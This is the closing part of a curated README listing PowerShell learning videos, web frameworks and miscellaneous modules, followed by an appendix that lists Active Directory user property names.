* [PowerShell Toolmaking (2 of 3) - Don Jones](https://www.youtube.com/watch?v=U849a17G7Ro) - Toolmaking (2 of 3) - Don Jones.
* [PowerShell Toolmaking (3 of 3) - Don Jones](https://www.youtube.com/watch?v=GXdmjCPYYNM) - Toolmaking (3 of 3) - Don Jones.
* [Sophisticated Techniques of Plain Text Parsing - Tobias Weltner](https://www.youtube.com/watch?v=Hkzd8spCfCU) - Great reference for text parsing.
* [Monad Manifesto Revisited - Jeffrey Snover](https://www.youtube.com/watch?v=j0EX5R2nnRI) - Jeffrey Snover reflects on the beginnings of the language and where it's going.
* [AD Forensics with PowerShell - Ashley McGlone](https://www.youtube.com/watch?v=VrDjiVbZZE8) - A lot of AD related scripting and analysis techniques.
* [Windows PowerShell What's New in V2 - SAPIEN](https://www.youtube.com/watch?v=85Yrs5ezxHE&list=PL6ue9e1DXqDv74YTX91gYonfFsweNmrDK) - Old but gold. Most of this is still very relevant.
* [All Things Microsoft PowerShell](https://www.youtube.com/watch?v=IHrGresKu2w&list=PLCGGtLsUjhm2k22nFHHdupAK0hSNZVfXi) - Another general language reference.
* [Research Triangle PowerShell User Group YouTube Channel](https://www.youtube.com/rtpsug/) - large catalog of user group meetings and demos by community members. 150+ hours of content.
-------------------------------------------------------------------------------------------------------------------------------------------
## Webserver
* [Flancy](https://github.com/toenuff/flancy) - Web microframework for Windows PowerShell.
* [Pode](https://github.com/Badgerati/Pode) - Pode is a Cross-Platform PowerShell framework for creating web servers to host REST APIs, Web Sites, and TCP/SMTP Servers.
* [Polaris](https://github.com/PowerShell/Polaris) - A cross-platform, minimalist web framework for PowerShell.
* [WebCommander](https://github.com/vmware/webcommander) - Run scripts and view results, in a friendly web GUI or via a web service.
* [Universal Dashboard](https://ironmansoftware.com/powershell-universal-dashboard) - Cross-platform module for developing websites and REST APIs.
-------------------------------------------------------------------------------------------------------------------------------------------
## Misc
* [DbgShell](https://github.com/Microsoft/DbgShell) - A PowerShell front-end for the Windows debugger engine.
* [poke](https://github.com/oising/poke) - Crazy cool reflection module for PowerShell.
  Explore and invoke private APIs like nobody is watching.
  Useful for security research, testing and quick hacks.
* [WSLab](https://github.com/microsoft/WSLab) - Windows Server rapid lab deployment scripts.
* [PoshBot](https://github.com/poshbotio/PoshBot) - Powershell-based bot framework.
* [PoShKeePass](https://github.com/PSKeePass/PoShKeePass) - Module for working with [KeePass](https://keepass.info) databases.
-------------------------------------------------------------------------------------------------------------------------------------------
## ✍️ Authors <a name = "authors"></a>
+ [@markconover](https://github.com/markconover)
--------------------------------------------------------------------------------------------------------------------------------------------
## 🎉 Acknowledgments <a name = "acknowledgments"></a>
+ Hat tip to anyone whose code was used
+ Inspiration
+ References
-------------------------------------------------------------------------------------------------------------------------------------------
## Appendix A ADUser Property List
AccountExpirationDate                 
accountExpires                        
AccountLockoutTime                    
AccountNotDelegated                   
AllowReversiblePasswordEncryption     
AuthenticationPolicy                  
AuthenticationPolicySilo              
BadLogonCount                         
badPasswordTime                       
badPwdCount                           
c                                     
CannotChangePassword                  
CanonicalName                         
Certificates                          
City                                  
CN                                    
codePage                              
Company                               
CompoundIdentitySupported             
Country                               
countryCode                           
Created                               
createTimeStamp                       
Deleted                               
Department                            
departmentNumber                      
Description                           
DisplayName                           
DistinguishedName                     
Division                              
DoesNotRequirePreAuth                 
dSCorePropagationData                 
EmailAddress                          
EmployeeID                            
EmployeeNumber                        
employeeType                          
Enabled                               
extensionAttribute1                   
extensionAttribute10                  
extensionAttribute2                   
extensionAttribute3                   
extensionAttribute5                   
Fax                                   
garbageCollPeriod                     
gidNumber                             
GivenName                             
HomeDirectory                         
HomedirRequired                       
HomeDrive                             
HomePage                              
HomePhone                             
Initials                              
instanceType                          
internetEncoding                      
isDeleted                             
KerberosEncryptionType                
LastBadPasswordAttempt                
LastKnownParent                       
lastLogoff                            
lastLogon                             
LastLogonDate                         
lastLogonTimestamp                    
legacyExchangeDN                      
LockedOut                             
lockoutTime                           
loginShell                            
logonCount                            
LogonWorkstations                     
mail                                  
mailNickname                          
managedObjects                        
Manager                               
MemberOf                              
MNSLogonAccount                       
mobile                                
MobilePhone                           
Modified                              
modifyTimeStamp                       
msDS-AuthenticatedAtDC                
msDS-ExternalDirectoryObjectId        
msDS-SupportedEncryptionTypes         
msDS-User-Account-Control-Computed    
msExchAddressBookFlags                
msExchArchiveGUID                     
msExchArchiveName                     
msExchArchiveQuota                    
msExchArchiveStatus                   
msExchArchiveWarnQuota                
msExchBypassAudit                     
msExchCalendarLoggingQuota            
msExchDumpsterQuota                   
msExchDumpsterWarningQuota            
msExchGroupSecurityFlags              
msExchMailboxAuditEnable              
msExchMailboxAuditLogAgeLimit         
msExchMDBRulesQuota                   
msExchModerationFlags                 
msExchPoliciesIncluded                
msExchProvisioningFlags               
msExchRecipientDisplayType            
msExchRecipientSoftDeletedStatus      
msExchRecipientTypeDetails            
msExchRemoteRecipientType             
msExchSafeSendersHash                 
msExchTransportRecipientSettingsFlags 
msExchUMDtmfMap                       
msExchUMEnabledFlags2                 
msExchUserAccountControl              
msExchUserHoldPolicies                
msExchVersion                         
msSFU30Name                           
msSFU30NisDomain                      
Name                                  
nTSecurityDescriptor                  
ObjectCategory                        
ObjectClass                           
ObjectGUID                            
objectSid                             
Office                                
OfficePhone                           
Organization                          
OtherName                             
PasswordExpired                       
PasswordLastSet                       
PasswordNeverExpires                  
PasswordNotRequired                   
physicalDeliveryOfficeName            
POBox                                 
PostalCode                            
PrimaryGroup                          
primaryGroupID                        
PrincipalsAllowedToDelegateToAccount  
ProfilePath                           
ProtectedFromAccidentalDeletion       
protocolSettings                      
proxyAddresses                        
PSComputerName                        
PSShowComputerName                    
pwdLastSet                            
RunspaceId                            
SamAccountName                        
sAMAccountType                        
ScriptPath                            
sDRightsEffective                     
ServicePrincipalNames                 
showInAddressBook                     
SID                                   
SIDHistory                            
SmartcardLogonRequired                
sn                                    
st                                    
State                                 
StreetAddress                         
Surname                               
targetAddress                         
textEncodedORAddress                  
Title                                 
TrustedForDelegation                  
TrustedToAuthForDelegation            
uid                                   
uidNumber                             
unixHomeDirectory                     
UseDESKeyOnly                         
userAccountControl                    
UserPrincipalName                     
uSNChanged                            
uSNCreated                            
whenChanged                           
whenCreated
